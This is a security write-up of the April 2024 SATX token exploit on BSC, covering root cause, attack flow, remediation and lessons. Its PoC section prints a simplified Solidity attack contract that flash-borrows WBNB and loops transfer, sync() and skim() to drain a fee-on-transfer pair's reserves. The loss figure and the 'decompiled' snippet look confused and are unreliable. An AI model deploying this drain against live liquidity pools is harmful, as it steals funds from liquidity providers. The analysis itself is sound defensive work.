# SATX — Flash Swap Analysis: Reserve Manipulation via skim/sync

| Field | Details |
|------|------|
| **Date** | 2024-04 |
| **Protocol** | SATX |
| **Chain** | BSC |
| **Loss** | ~$999M (nominal; actual loss scale based on liquidity) |
| **Attack Contract** | [0x9C63d632](https://bscscan.com/address/0x9C63d6328C8e989c99b8e01DE6825e998778B103) |
| **SATX Token** | [0xFd80a436](https://bscscan.com/address/0xFd80a436dA2F4f4C42a5dBFA397064CfEB7D9508) |
| **Root Cause** | Repeated discrepancies between pair reserves and actual balances were created by combining `skim()` + `sync()` on the SATX fee-on-transfer token with flash swaps, draining WBNB |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/SATX_exp.sol) |

---

## 1. Vulnerability Overview

SATX is a token with a transfer tax mechanism, which causes a discrepancy between the actual balance and the AMM reserves due to the tax. The attacker borrowed WBNB via a flash swap on the WBNB-CAKE pair, bought SATX to add liquidity to the WBNB-SATX pair, then repeatedly used `skim()` and `sync()` to extract reserve arbitrage.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: fee-on-transfer token + skim/sync combination vulnerability
// SATX: tax on transfer → actual balance < transfer amount
// Can create state where pair.balance > pair.reserve

interface IPancakePair {
    function skim(address to) external;   // balance - reserve → to
    function sync() external;             // force-sync reserve = balance
    function swap(uint, uint, address, bytes calldata) external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

// Attack pattern:
// 1. Transfer SATX to pair (tax causes actual balance < transfer amount)
// 2. sync() → sets reserve to lower actual balance
// 3. Transfer additional SATX
// 4. skim() → extract (balance - reserve)
// Repeat to drain reserves

// ✅ Safe code: disable skim for fee-on-transfer tokens
function skim(address to) external lock {
    require(!hasFeeOnTransfer, "skim disabled for fee tokens");
    // ...
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: SATX_decompiled.sol
contract SATX {
    function skim(address p0) external {}  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] 0.9 BNB → WBNB
  │
  ├─→ [2] WBNB → SATX swap
  │
  ├─→ [3] Add liquidity to WBNB-SATX pair
  │
  ├─→ [4] Flash swap on WBNB-CAKE pair: borrow WBNB
  │         └─ enter pancakeCall()
  │
  ├─→ [5] Swap on WBNB-SATX pair
  │
  ├─→ [6] Manipulate reserves via repeated skim() + sync() combination
  │         └─ accumulate balance/reserve discrepancy caused by transfer tax
  │
  ├─→ [7] Reverse swap: SATX → WBNB
  │
  ├─→ [8] Repay flash swap
  │
  └─→ [9] Extract WBNB profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IPancakePair {
    function skim(address to) external;
    function sync() external;
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

contract AttackContract {
    IPancakePair constant wbnbCake = IPancakePair(/* WBNB-CAKE pair */);
    IPancakePair constant satxPair = IPancakePair(/* WBNB-SATX pair */);
    IERC20       constant SATX     = IERC20(0xFd80a436dA2F4f4C42a5dBFA397064CfEB7D9508);
    IERC20       constant WBNB     = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

    function testExploit() external payable {
        // [1] BNB → WBNB + buy SATX
        WBNB.deposit{value: 0.9 ether}();
        swapWBNBToSATX(0.9 ether);

        // [2] Borrow WBNB via flash swap on WBNB-CAKE pair
        wbnbCake.swap(flashAmount, 0, address(this), abi.encode("flash"));
    }

    function pancakeCall(address, uint256 amount, uint256, bytes calldata) external {
        // [3] Swap on WBNB-SATX pair
        satxPair.swap(0, satxAmount, address(this), "");

        // [4] Manipulate reserves via repeated skim/sync
        for (uint i = 0; i < 5; i++) {
            SATX.transfer(address(satxPair), satxChunk);
            satxPair.sync();   // reserve = balance (sync to lower value)
            satxPair.skim(address(this));  // extract excess
        }

        // [5] Reverse swap: SATX → WBNB
        swapSATXToWBNB(SATX.balanceOf(address(this)));

        // [6] Repay flash swap
        WBNB.transfer(address(wbnbCake), amount + fee);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Fee-on-transfer token skim/sync reserve manipulation |
| **CWE** | CWE-840: Business Logic Errors |
| **Attack Vector** | External (flash swap + repeated skim/sync) |
| **DApp Category** | Fee-on-transfer token + Uniswap V2 pair |
| **Impact** | Pair reserve drain (nominal $999M) |

## 6. Remediation Recommendations

1. **Disable skim for fee-on-transfer tokens**: Disable `skim()` on pairs with transfer tax tokens
2. **Restrict sync()**: Limit repeated sync calls within the same block
3. **Fee-on-transfer AMM**: Use a dedicated AMM that accounts for fees for tax tokens
4. **Minimum reserve protection**: Block skim if reserves fall below a threshold after the call

## 7. Lessons Learned

- skim/sync combination attacks have been recurring on BSC fee-on-transfer tokens such as SATX, ATM, and MARS.
- The `skim()` and `sync()` functions are structurally vulnerable when used with tokens that have a fee mechanism.
- Fee-on-transfer token projects must review this vulnerability before using a standard Uniswap V2 fork AMM.